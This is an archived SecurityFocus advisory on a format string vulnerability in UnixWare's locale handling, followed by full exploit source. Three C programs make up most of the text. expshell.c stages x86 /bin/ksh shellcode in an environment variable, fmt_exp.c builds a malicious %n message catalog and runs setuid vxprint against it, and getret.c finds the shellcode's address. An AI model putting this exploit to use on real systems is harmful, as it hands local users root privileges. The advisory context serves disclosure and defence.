source: http://www.securityfocus.com/bid/4060/info

UnixWare is a commercially available Unix Operating System. It was originally developed by SCO, and is now distributed and maintained by Caldera.

A format string vulnerability in the locale subsystem could lead to a user gaining elevated privileges. A local user could potentially supply maliciously crafted message catalogs through the LC_MESSAGES environment variable. This could allow a local user to load arbitrary message catalogs into setuid or setgid programs, and execute arbitrary code with setuid/setgid privileges. 

--------------------------expshell.c-----------------------------

#include <stdio.h>

char shellcode[]=
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xeb\x1a"             /* jmp     <shellcode+28>         */
    "\x33\xd2"             /* xorl    %edx,%edx              */
    "\x58"                 /* popl    %eax                   */
    "\x8d\x78\x14"         /* leal    0x14(%eax),%edi        */
    "\x57"                 /* pushl   %edi                   */
    "\x50"                 /* pushl   %eax                   */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\x92"                 /* xchgl   %eax,%edx              */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\x88\x42\x08"         /* movb    %al,0x8(%edx)
*/
    "\x83\xef\x3b"         /* subl    $0x3b,%edi             */
    "\xb0\x9a"             /* movb    $0x9a,%al              */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\x47"                 /* incl    %edi                   */
    "\xb0\x07"             /* movb    $0x07,%al              */
    "\xab"                 /* stosl   %eax,%es:(%edi)        */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xe8\xe1\xff\xff\xff" /* call    <shellcode+2>          */
    "/bin/ksh"
;

main(int argc, char *argv[])
{
   char buff[1024];

   sprintf(buff, "EGG=%s", shellcode);
   putenv(buff);

   putenv("LC_MESSAGES=/tmp");
   system("/usr/bin/tcsh");
}

-----------------------------------fmt_exp.c--------------------------------

#include <stdio.h>
#include "shellcode.h"

/* This is base of format string return address */
/* Base address of vxprint is 0x20c7c(134268) */
#define BASE 134268

main(int argc, char *argv[])
{
   FILE *fp;
   char *retaddr;
   long g_len, offset;
   int count, count2, line=700, n=19;

   if(argc < 2 || argc > 3) {
      printf("Usage: %s ret-address offset\n", argv[0]);
      exit(1);
   }

   retaddr = argv[1];
   if(argc == 3) offset = atol(argv[2]);
   else offset = 0;

   g_len = strtol(retaddr, NULL, 16);
   g_len -= BASE;
   g_len += offset;
   fp = fopen("testdef", "w+");
   if(fp == NULL) {
      fprintf(stderr, "can not open file.\n"); exit(1);
   }
   for(count=0; count<line; count++) {
      for(count2=0; count2<n; count2++)
         fprintf(fp, "%%10x");
      fprintf(fp, "%%%dx%%n\n", g_len);
   }
   fclose(fp);

   remove("testout");
   system("mkmsgs testdef testout");
   mkdir("/tmp/LC_MESSAGES", 0755);
   system("mv
testout /tmp/LC_MESSAGES/vxvm.mesg");

   printf("ret addr = 0x%x\n", g_len);
   /* this, also can any set uid command */
   execl("/usr/sbin/vxprint", "vxprint", "---", NULL);
}

-------------------------------------getret.c--------------------------------------

main()
 {
 char *a;
 a = getenv("EGG");
 printf ("e=%p\n", a);
 }
